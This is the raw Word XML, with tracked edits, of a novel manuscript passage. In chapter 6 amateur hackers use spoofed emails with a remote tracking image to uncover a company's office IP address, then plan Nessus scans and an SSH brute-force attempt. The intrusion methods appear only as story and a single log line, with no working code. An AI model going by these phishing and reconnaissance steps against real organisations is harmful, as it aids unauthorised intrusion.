        <w:r w:rsidRPr="000D3488" w:rsidDel="00286467">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>l</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w: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“As paperwork matter,” he explained, “I tell you </w:t>
      </w:r>
      <w:del w:id="535" w:author="TextVet" w:date="2016-03-15T16:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006738A4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>violence has no place in work environment. Then you sign this statement…” He passed her a pen and a printed page. “…saying that I spoke with you to ensure it won’t happen again, and that your action was as private matter between you and Roger and having no involvement with company.”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murmured, “Is my staying late tonight some kind of punishment?”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 not punish, young lady!” Passinsky fired back. “This is simple logical consequence. Forms for Julie need to be done. I could have done them this afternoon. Instead, I had to take care of this. Do I make myself clear?”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sighed. “Yeah.”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looked at the form in Tina’s hands with contempt. “And what if we want to handle this as a ‘science matter’?”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“Ah! As science matter, is completely different,” said Passinsky, suddenly upbeat. “As science matter, we use this as opportunity to do in-vivo study of modulating effects of oxytocin and vasopressin on axonal projections from Broca’s area to limbic system.”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“Which means…?” asked Roger.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“Which means we put Christina’s head into stabilizing vise, open top of her skull to put under high-resolution cameras, and inject voltage-sensitive dye. Then you stand nearby and say things to make her angry, and we record which neurons activate.”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stared at them patiently.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blinked. “You… want to saw my skull open?”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yes,” Passinsky replied. “How else to see electrofluorescent dye?”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is a joke, right?”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 yes. Is a joke. Of course. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Unless</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> if you agree…? In which case I will stay late myself, to prepare experimental apparatus. And maybe take care of Julie’s forms myself while I am here. If you understand my meaning.”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Shaking her head, Tina signed the statement and steeled herself for a late night.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“Ah! That is what you choose?” Passinsky said with disappointment. “Too bad. I like doing science. I don’t like doing paperwork.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>6</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“Send, send, send!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” Danny commanded. He watched a laptop over Moshen’s shoulder, squinting through the glare of the sunlight from the bohemian coffee shop’s windows.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flicked the touchpad. “Done! And now… we wait!”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team sat at a cluster of tables at the B&amp;O Espresso, between walls lined with brass clocks and framed vintage posters. The B&amp;O made an ideal base — it had power outlets, free Wi-Fi access, and a menu of quadruple-shot chocolate lattes. Danny was already caffeinated to the point of nausea.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“What’d I miss?” asked Jason as he returned to the table.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“We’ve gone phishing!” said Moshen.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“We’re trying to figure out Tungsten’s IP address,” Danny clarified.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 that something you can get from their website?”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shook his head. “Their website isn’t served from their office. They use Rackspace as a hosting solution. If we trace the route from here to their website, we won’t find their office IP address; we’ll just find their third-party web service provider.”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you </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> see their website, right?” asked Jason. “I always thought that’s the first thing hackers go for.”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“Their website has nothing to hack,” Danny answered. “They have a very simple, primitive web page. You can’t even use it for buying anything. If they had a big, complicated modern site with shopping carts and user comment sections, it’d be a different story. But as it stands, it’s only a bunch of sales pitches, and some phone numbers and email addresses.”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see,” Jason said. “Those all go to their receptionist, by the way. I’ve already checked out Tungsten’s public contact info.”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asked, “All of Tungsten’s emails go to the same person?”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Jason nodded. “Christina Giordano</w:t>
      </w:r>
      <w:ins w:id="536" w:author="TextVet" w:date="2016-03-15T16:07:00Z">
        <w:r w:rsidR="00C24776">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="537" w:author="TextVet" w:date="2016-03-15T16:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C24776">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538" w:author="TextVet" w:date="2016-03-15T16:07:00Z">
        <w:r w:rsidR="00C24776">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="539" w:author="TextVet" w:date="2016-03-15T16:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C24776">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heir all-purpose office admin.”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“Does she like spam?” asked Moshen. “I just sent her some hot, juicy junk</w:t>
      </w:r>
      <w:ins w:id="540" w:author="TextVet" w:date="2016-03-15T16:08:00Z">
        <w:r w:rsidR="00E145D1">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mail.”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cocked an eyebrow.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explained, “About half an hour ago, Moshen and I hopped on GoDaddy and registered a website. We called it ‘Prismatic Creations’, </w:t>
      </w:r>
      <w:del w:id="541" w:author="TextVet" w:date="2016-03-15T16:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00232D9C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">made it look like a web design company. Then, we sent a few fake business solicitations to Tungsten. </w:t>
      </w:r>
      <w:ins w:id="542" w:author="TextVet" w:date="2016-03-15T16:09:00Z">
        <w:r w:rsidR="0080523B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="543" w:author="TextVet" w:date="2016-03-15T16:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0080523B">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t the top of these emails, we added an image.”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what?”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“You ever get an email with pictures in it?” Danny </w:t>
      </w:r>
      <w:commentRangeStart w:id="544"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>said</w:t>
      </w:r>
      <w:commentRangeEnd w:id="544"/>
      <w:r w:rsidR="006B61CF">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="544"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “And your browser </w:t>
      </w:r>
      <w:del w:id="545" w:author="TextVet" w:date="2016-03-15T16:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F226A8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">gives you a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>warn</w:t>
      </w:r>
      <w:ins w:id="546" w:author="TextVet" w:date="2016-03-15T16:11:00Z">
        <w:r w:rsidR="00F226A8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s you with</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="547" w:author="TextVet" w:date="2016-03-15T16:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F226A8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing that says</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, ‘Click here to see the images in this message.’? Well, those images aren’t </w:t>
      </w:r>
      <w:del w:id="548" w:author="TextVet" w:date="2016-03-15T16:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0040044D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">actually </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>part of the email itself. What the email contains are </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>references</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to images somewhere else on the Internet. The image at the top of our junk</w:t>
      </w:r>
      <w:ins w:id="549" w:author="TextVet" w:date="2016-03-15T16:10:00Z">
        <w:r w:rsidR="00CE10D8">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mail comes from th</w:t>
      </w:r>
      <w:ins w:id="550" w:author="TextVet" w:date="2016-03-15T16:10:00Z">
        <w:r w:rsidR="000E5A02">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="551" w:author="TextVet" w:date="2016-03-15T16:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000E5A02">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>is</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> website </w:t>
      </w:r>
      <w:del w:id="552" w:author="TextVet" w:date="2016-03-15T16:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE10D8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>we just built. And Moshen’s on the administrative back end right now, watching connections come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when the office admin opens that email… her computer will automatically connect to your new website?”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“Right,” said Danny. “And her computer is at her desk, so the IP address that she’s connecting from will be Tungsten’s corporate headquarters. Now, mind you, she could be using a really good spam filter, which would block the messages. Or she might delete them without opening. So this isn’t guaranteed to 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Moshen, </w:t>
      </w:r>
      <w:del w:id="553" w:author="TextVet" w:date="2016-03-15T16:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006A3EAF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">his eyes </w:t>
      </w:r>
      <w:ins w:id="554" w:author="TextVet" w:date="2016-03-15T16:15:00Z">
        <w:r w:rsidR="006A3EAF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>devouring</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="555" w:author="TextVet" w:date="2016-03-15T16:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006A3EAF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his laptop screen, shot both thumbs </w:t>
      </w:r>
      <w:del w:id="556" w:author="TextVet" w:date="2016-03-15T16:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AD2D41">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">excitedly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">up. </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="557" w:author="TextVet" w:date="2016-03-15T16:17:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“It just did!”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w:t>
      </w:r>
      <w:ins w:id="558" w:author="TextVet" w:date="2016-03-15T16:17:00Z">
        <w:r w:rsidR="00DA52B2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>leaned</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="559" w:author="TextVet" w:date="2016-03-15T16:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA52B2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>stuck his head</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> over Moshen’s shoulder. The screen displayed:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>68.178.232.100 - - [20/Jul/2011:01:46:47 +0000] "GET /imag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>es/logo.gif?tracker=73567354756 HTTP/1.1" 200 1537 "-" "Mo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t xml:space="preserve">zilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Thunderbird/3.0.1"</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“She’s using Mozilla Thunderbird mail reader on Windows 7,” Danny said. “Moshen, go cruise newsgroups and hacker forums; try to find exploits. I’ll check out Thunderbird’s source code and look for weaknesses. Mike, fire up Nessus and start probing their firewall.”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tried to keep up. “Is there anything I could be doing?” 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said Danny. “Get us more lattes.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BD6B5E" w:rsidRDefault="00BD6B5E" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="560" w:author="TextVet" w:date="2016-03-15T16:18:00Z"/>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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“Nothing’s getting through!”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Moshen hissed</w:t>
      </w:r>
      <w:ins w:id="561" w:author="TextVet" w:date="2016-03-15T16:18:00Z">
        <w:r w:rsidR="00773A12">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="562" w:author="TextVet" w:date="2016-03-15T16:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00773A12">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="563" w:author="TextVet" w:date="2016-03-15T16:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00773A12">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> H</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="564" w:author="TextVet" w:date="2016-03-15T16:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00773A12">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>is body</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hunched over his laptop, </w:t>
      </w:r>
      <w:ins w:id="565" w:author="TextVet" w:date="2016-03-15T16:19:00Z">
        <w:r w:rsidR="00773A12">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">his </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">fingers banging </w:t>
      </w:r>
      <w:del w:id="566" w:author="TextVet" w:date="2016-03-15T16:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00773A12">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">on </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the keyboard. “The packets are just disappearing!”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“Did Tungsten go offline?” asked Danny, standing over his shoulder. “Or did we?”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“Neither. I can still reach Tungsten if I bounce through a proxy server,” said Moshen. “It’s like something started blocking </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>our</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> connection — </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>specifically</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> us here at the coffee shop. It doesn’t make any sense…”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saw their agitation. “What are you guys doing?”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up from Moshen’s laptop. “We found an app called SSHatter on a hacker forum. We’re trying to use it to crack our way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raised an eyebrow. “You own a botnet?”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we just ran it on Moshen’s laptop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paused. “That’s… Um… Not how it’s designed to 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returned to the tables with several cups of coffee. “Hey, guys. Is everything alright?”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replied, “Have you ever heard of SSH?” Jason shook his head. “It stands for ‘Secure Shell’. It’s a remote login program. It’s a very common tool — system administrators use it to access their own systems from home, for example. Most corporate servers have it installed.”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nodded. “Like a back door for authorized personnel only,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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
